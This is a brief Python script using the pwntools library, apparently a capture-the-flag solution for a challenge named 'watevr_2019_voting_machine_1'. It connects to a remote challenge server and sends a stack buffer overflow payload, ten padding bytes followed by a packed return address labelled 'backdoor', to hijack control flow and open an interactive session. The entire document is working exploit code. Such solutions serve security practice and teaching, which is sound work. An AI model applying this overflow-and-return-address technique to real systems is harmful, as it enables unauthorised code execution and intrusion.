from pwn import *

#p = process('./watevr_2019_voting_machine_1')
p = remote('node4.buuoj.cn', 27075)

backdoor = 0x400807

payload = b'a' * 0xa + p64(backdoor)

p.sendlineafter(b'possible', payload)

p.interactive()